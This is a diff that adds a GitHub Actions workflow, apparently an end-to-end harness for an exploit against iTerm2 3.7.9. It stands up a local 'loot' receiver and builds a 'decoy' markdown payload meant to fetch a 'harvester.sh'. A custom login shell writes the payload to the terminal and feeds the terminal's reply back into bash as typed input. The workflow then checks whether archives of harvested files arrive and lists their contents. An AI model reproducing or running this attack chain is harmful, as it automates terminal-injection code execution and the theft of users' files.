@@ -1,0 +1,264 @@
+name: macos-e2e
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/macos-e2e.yml'
+      - 'tools/**'
+      - 'harvester.sh'
+  workflow_dispatch:
+
+jobs:
+  e2e:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          python3 --version
+
+      - name: Put harvester + helper in place
+        run: |
+          set -eux
+          ls -la
+          cp harvester.sh tools/harvester.sh 2>/dev/null || true
+          ls -la tools/
+
+      - name: Start receiver
+        run: |
+          set -eux
+          mkdir -p loot
+          # 用 8099，serve.py 从 tools/ 里读 harvester.sh
+          cd tools
+          cp ../serve.py . 2>/dev/null || true
+          nohup python3 serve.py --port 8099 --bind 127.0.0.1 >/tmp/srv.log 2>&1 &
+          sleep 3
+          curl -s -o /dev/null -w "GET status=%{http_code}\n" http://127.0.0.1:8099/ || true
+          cat /tmp/srv.log
+
+      - name: Build decoy
+        run: |
+          set -eux
+          python3 tools/stage1.py --host 127.0.0.1 --port 8099 \
+            --title anubis-deploy-kit --verbose --out /tmp/payload.md
+          echo "--- first bytes ---"
+          od -c /tmp/payload.md | head -5
+
+      - name: Install iTerm2 3.7.9
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-3_7_9.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Install e2e login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.py <<'SHEOF'
+          #!/usr/bin/env python3
+          import os, sys, time, select, fcntl, traceback
+
+          LOG = "/tmp/lsh.log"
+          def log(m):
+              try:
+                  open(LOG, "a").write(str(m) + "\n")
+              except Exception:
+                  pass
+
+          def main():
+              log("=== e2e shell pid=%d ===" % os.getpid())
+              try:
+                  log("tty=%s" % os.ttyname(0))
+              except Exception:
+                  os.execv("/bin/bash", ["/bin/bash", "-l"]); return
+
+              import tty as ttymod
+              try:
+                  ttymod.setraw(0, ttymod.TCSANOW)
+                  log("raw mode set")
+              except Exception as e:
+                  log("setraw failed: %r" % (e,))
+
+              time.sleep(2)
+
+              try:
+                  payload = open("/tmp/payload.md", "rb").read()
+                  os.write(1, payload)
+                  log("payload written: %d bytes" % len(payload))
+              except Exception as e:
+                  log("payload failed: %r" % (e,))
+
+              time.sleep(2)
+
+              try:
+                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
+                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+              except Exception:
+                  pass
+
+              captured = b""
+              deadline = time.time() + 6
+              while time.time() < deadline:
+                  try:
+                      r, _, _ = select.select([0], [], [], 0.25)
+                  except Exception:
+                      break
+                  if not r:
+                      continue
+                  try:
+                      d = os.read(0, 65536)
+                  except OSError:
+                      d = b""
+                  if d:
+                      captured += d
+
+              log("captured %d bytes" % len(captured))
+              try:
+                  open("/tmp/captured.hex", "w").write(captured.hex())
+                  open("/tmp/decoded.txt", "w").write(
+                      "HEX:\n%s\n\nREPR:\n%r\n" % (captured.hex(), captured))
+              except Exception:
+                  pass
+
+              os.chdir(os.path.expanduser("~"))
+
+              import pty
+              pid, fd = pty.fork()
+              if pid == 0:
+                  try:
+                      os.chdir(os.path.expanduser("~"))
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      os._exit(1)
+              log("inner bash forked")
+
+              if captured:
+                  try:
+                      os.write(fd, captured)
+                      log("fed %d bytes" % len(captured))
+                  except Exception as e:
+                      log("feed failed: %r" % (e,))
+
+              time.sleep(0.5)
+              try:
+                  os.write(fd, b"\n")
+                  log("newline injected")
+              except Exception as e:
+                  log("newline failed: %r" % (e,))
+
+              start = time.time()
+              while time.time() - start < 25:
+                  try:
+                      r, _, _ = select.select([0, fd], [], [], 0.25)
+                  except Exception:
+                      break
+                  for f in r:
+                      try:
+                          d = os.read(f, 65536)
+                      except OSError:
+                          d = b""
+                      if not d:
+                          continue
+                      try:
+                          os.write(fd if f == 0 else 1, d)
+                      except Exception:
+                          pass
+
+              log("=== done ===")
+              time.sleep(10)
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception:
+                  log("FATAL:\n" + traceback.format_exc())
+                  try:
+                      os.execv("/bin/bash", ["/bin/bash", "-l"])
+                  except Exception:
+                      pass
+
+          SHEOF
+          PY=$(which python3)
+          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
+          chmod 755 /tmp/lsh.py
+          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.py | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.py "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Launch iTerm2
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 32
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait for loot
+        run: |
+          for i in $(seq 1 20); do
+            sleep 6
+            if ls loot/*.tar.gz >/dev/null 2>&1; then
+              echo "loot arrived after $((i*6))s"
+              break
+            fi
+          done
+          sleep 4
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== E2E REPORT ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- captured kitty response ---"
+          cat /tmp/decoded.txt 2>/dev/null || echo "NO_CAPTURE"
+          echo ""
+          echo "--- receiver log ---"
+          cat /tmp/srv.log 2>/dev/null || echo "(no srv log)"
+          echo ""
+          echo "--- loot ---"
+          if ls loot/*.tar.gz >/dev/null 2>&1; then
+            for f in loot/*.tar.gz; do
+              echo "[RESULT] LOOT RECEIVED: $f"
+              ls -la "$f"
+              echo "--- contents ---"
+              tar tzf "$f" | head -40
+              echo "--- sizes ---"
+              tar tzvf "$f" 2>/dev/null | head -25 || true
+            done
+          else
+            echo "[RESULT] NO_LOOT"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: e2e-evidence
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/decoded.txt
+            /tmp/srv.log
+            /tmp/shot.png
+            loot/*.tar.gz
+          if-no-files-found: warn
